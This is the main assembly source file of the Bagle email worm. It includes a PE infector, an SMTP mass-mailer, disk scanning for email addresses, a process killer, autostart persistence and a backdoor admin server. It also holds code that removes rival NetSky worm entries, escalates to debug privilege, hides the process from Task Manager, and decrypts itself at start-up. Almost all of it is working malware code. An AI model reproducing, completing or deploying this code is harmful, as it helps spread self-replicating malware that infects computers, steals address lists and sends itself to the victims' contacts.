; #########################################################################

        .486
        .model flat, stdcall
        option casemap :none   ; case sensitive

; #########################################################################

    .nolist        
        include kernel32.inc
        include windows.inc
        include user32.inc
        include wsock32.inc
        include ole32.inc
        include shlwapi.inc
        include oaidl.inc
        include wininet.inc
        include advapi32.inc
        include urlmon.inc
        include shell32.inc
        include gdi32.inc

        .list
        includelib kernel32.lib
        includelib user32.lib
        includelib wsock32.lib
        includelib ole32.lib
        includelib shlwapi.lib
        includelib wininet.lib
        includelib advapi32.lib
        includelib urlmon.lib
        includelib shell32.lib
        includelib gdi32.lib

; #########################################################################

        szText MACRO Name, Text:VARARG
          LOCAL lbl
          jmp lbl
            Name db Text,0
          lbl:
        ENDM

        m2m MACRO M1, M2
          push M2
          pop  M1
        ENDM

        mNextListEntry MACRO ML
          cld
          xor     eax, eax
          or      ecx, -1
          repnz scasb
          cmp     byte ptr[edi], 0
          jnz     ML
        ENDM

.data
        EncryptStart2   dw      "$$", "$$"

.code
        EncryptStart    dw      "$$", "$$"

        include Config.inc
        include Src\SrcFile.inc
        include Utils.asm
        include Stream.asm
        include PassGen.asm
        include HashTable.asm
        IFNDEF  DisablePK
                include ProcKiller.asm
        ENDIF
        include CPLStub.inc
        include CPL.asm
        include VBS.asm
        include HTA.asm
        include ZIP.asm
        include StartUp.asm
        include Network.asm
        IFNDEF  DisableNotify
                include Notify.asm
        ENDIF
        include Admin.asm
        include DNS.asm
        include SMTPClient.asm
        include SMTPThread.asm
        IFNDEF  DisableInfect
                include PVG.asm
                include PEInfector.asm
        ENDIF
        include EmailScanner.asm
        include HDDScanner.asm
        include SMTPMessage.asm

        .data
                ; Do not change order
                szSeDebug               db      "SeDebugPrivilege",0
                szAdvApi                db      "advapi32.dll",0
                                        db      "AdjustTokenPrivileges", 0
                                        db      "InitializeAcl",0
                                        db      "LookupPrivilegeValueA",0
                                        db      "OpenProcessToken",0
                                        db      "SetSecurityInfo",0,0

                szKernel32              db      "kernel32.dll",0
                                        db      "RegisterServiceProcess",0,0    ;  RegisterServiceProcess(GetCurrentProcessID,1);. ..

                dwAdjustTokenPrivileges dd      0
                dwInitializeAcl         dd      0
                dwLookupPrivilegeValue  dd      0
                dwOpenProcessToken      dd      0
                dwSetSecurityInfo       dd      0
                dwRegServiceProcess     dd      0

                szNetworkParams         db      "iphlpapi.dll",0,"GetNetworkParams",0,0
                dwGetNetworkParams      dd      0

                szMutexes               db      "MuXxXxTENYKSDesignedAsTheFollowerOfSkynet-D",0 ; Netsky.AA
                                        db      "'D'r'o'p'p'e'd'S'k'y'N'e't'",0 ; NetSky.P
                                        db      "_-oOaxX|-+S+-+k+-+y+-+N+-+e+-+t+-|XxKOo-_",0 ; NetSky.Q
                                        db      "[SkyNet.cz]SystemsMutex",0     ; NetSky.D
                                        db      "AdmSkynetJklS003",0            ; NetSky.B
                                        db      "____--->>>>U<<<<--____",0      ; NetSky.X
                                        db      "_-oO]xX|-S-k-y-N-e-t-|Xx[Oo-_",0,0 ; NetSky.P

                ; NetSky startup names
                szNetSkies              db      "My AV",0       ; NetSky.K
                                        db      "Zone Labs Client Ex",0 ; NetSky.F
                                        db      "9XHtProtect",0 ; NetSky.M
                                        db      "Antivirus",0   ; NetSky.H
                                        db      "Special Firewall Service",0 ; NetSky.G
                                        db      "service",0     ; NetSky.A, NetSky.B
                                        db      "Tiny AV",0     ; NetSky.I
                                        db      "ICQNet",0      ; NetSky.C
                                        db      "HtProtect",0   ; NetSky.L
                                        db      "NetDy",0       ; NetSky.N
                                        db      "Jammer2nd",0   ; NetSky.Z
                                        db      "FirewallSvr",0 ; NetSky.X
                                        db      "MsInfo",0      ; NetSky.O
                                        db      "SysMonXP",0    ; NetSky.Q
                                        db      "EasyAV",0      ; NetSky.S, NetSky.T, NetSky.U
                                        db      "PandaAVEngine",0       ; NetSky.R
                                        db      "Norton Antivirus AV",0 ; NetSky.P
                                        db      "KasperskyAVEng",0      ; NetSky.V
                                        db      "SkynetsRevenge",0      ; NetSky.AAA
                                        db      "ICQ Net",0,0   ; NetSky.D, NetSky.E, NetSky.J

                EncryptEnd2             dw      "$$", "$$"

        .code

; Create NetSky mutexes, to prevent it from running
RegNetSky proc uses edi
        mov     edi, offset szMutexes

@next:
        invoke  CreateMutex, NULL, TRUE, edi
        mNextListEntry @next

        ret
RegNetSky endp

; Remove NetSky startup entries
KillNetSky proc uses edi
        LOCAL   hkHandle: DWORD

        mov     edi, offset szNetSkies

@next:
        invoke  RegCreateKey, HKEY_CURRENT_USER, offset szRegAutoPath, addr hkHandle
        invoke  RegDeleteValue, hkHandle, edi
        invoke  RegCloseKey, hkHandle
        invoke  RegCreateKey, HKEY_LOCAL_MACHINE, offset szRegAutoPath, addr hkHandle
        invoke  RegDeleteValue, hkHandle, edi
        invoke  RegCloseKey, hkHandle

        mNextListEntry @next

        ret
KillNetSky endp

; Adjust some privileges for current process
ProcessStartup proc uses esi edi
        LOCAL   hToken: DWORD
        LOCAL   SeDebugNameValue: QWORD
        LOCAL   tkp: TOKEN_PRIVILEGES
        LOCAL   len: DWORD
        LOCAL   myACL: ACL

        ; Load libraries
        invoke  PayLoadDll, offset szAdvApi, offset dwAdjustTokenPrivileges
        invoke  PayLoadDll, offset szNetworkParams, offset dwGetNetworkParams
        invoke  PayLoadDll, offset szKernel32, offset dwRegServiceProcess

        ; Win95/98 only

        ; Hide in taskmanager
        .IF     dwRegServiceProcess
                push    1
                invoke  GetCurrentProcessId
                push    eax
                call    dwRegServiceProcess
        .ENDIF

        .IF     !dwAdjustTokenPrivileges || !dwInitializeAcl || !dwLookupPrivilegeValue || !dwOpenProcessToken || !dwSetSecurityInfo
                ret
        .ENDIF

        ; WinNT/2k/XP only

        ; Set debug status
        invoke  ZeroMemory, addr myACL, sizeof ACL
        push    2
        push    sizeof ACL
        lea     eax, myACL
        push    eax
        call    dwInitializeAcl

        invoke  GetCurrentProcess
        push    eax
        xchg    eax, edx
        push    0
        lea     eax, myACL
        push    eax
        push    0
        push    0
        push    4
        push    6
        push    edx
        call    dwSetSecurityInfo

        ; Adjust debug privilege
        pop     edx
        lea     eax, hToken
        push    eax
        push    TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY
        push    edx
        call    dwOpenProcessToken

        lea     eax, SeDebugNameValue
        push    eax
        push    offset szSeDebug
        push    NULL
        call    dwLookupPrivilegeValue

        lea     esi, SeDebugNameValue
        lea     edi, tkp.Privileges[0].Luid
        mov     ecx, 8
        rep movsb
        mov     tkp.PrivilegeCount, 1
        mov     tkp.Privileges[0].Attributes, SE_PRIVILEGE_ENABLED

        lea     eax, len
        push    eax
        lea     eax, tkp
        push    eax
        push    sizeof TOKEN_PRIVILEGES
        push    eax
        push    FALSE
        push    hToken
        call    dwAdjustTokenPrivileges
        ret
ProcessStartup endp

StartTheWork proc
        LOCAL   WSAData: WSADATA

        invoke  CoInitialize, 0
        invoke  RegNetSky
        invoke  KillNetSky
        invoke  ProcessStartup
        invoke  StartUp

        invoke  WSAStartup, 0101h, addr WSAData ; useless shit

        ; Email stuff initialization
        invoke  EmailScanInit
        invoke  InitSMTPQueue

        ; Build attach
        invoke  SrcFileToBase64
        invoke  EncodeSelf

        ; Check for deactivation
        invoke  IsShouldRun
        .IF     !eax
                invoke  DoSelfDelete
        .ENDIF

        ; Start process killer
        IFNDEF  DisablePK
                invoke  StartProcessKiller
        ENDIF

        ; Start notify
        IFNDEF  DisableNotify
                invoke  StartNotify
        ENDIF

        jmp     @n
        EncryptEnd      dw      "$$", "$$"

       
        db      13,10,13,10,13,10,13,10
        db      "Frozen in the silence,",13,10
        db      "Lying down in black,",13,10
        db      "Awaiting Nyx's darkness,",13,10
        db      "Disembodied souls rended by Stygian flack.",13,10
        db      "-- I-Worm.Bagle.?? Ripped by -=[Azag-TH0TH]=- (c) 8.9.2004"
        db      13,10,13,10,13,10,13,10

@n:
        ; Create admin synchro mutex
        invoke  CreateMutex, NULL, FALSE, NULL
        mov     mootex, eax

        ; Start up admin server
        invoke  AbstractStartServer, BasePort, offset AdminThread

        nop

        ; Harvest emails
        invoke  HDDScanDrives

        ; Infinite loop
@l_inf:
        invoke  WriteAutoStart
        nop
        invoke  Sleep, 100
        jmp     @l_inf
        ret
StartTheWork endp

DecryptProc proc uses edi lpStart, lpEnd: DWORD
        mov edi, lpStart
        .WHILE  edi != lpEnd
                inc     edi
                xor     byte ptr[edi-1], 5
                not     byte ptr[edi-1]
        .ENDW
        ret
DecryptProc endp

; OEP
start:
        invoke  DecryptProc, offset EncryptStart2, offset EncryptEnd2
        invoke  DecryptProc, offset EncryptStart, offset EncryptEnd
        add     dword ptr[@mod_jump+1], 100001h
@mod_jump:
        jmp     StartTheWork-100001h
end start
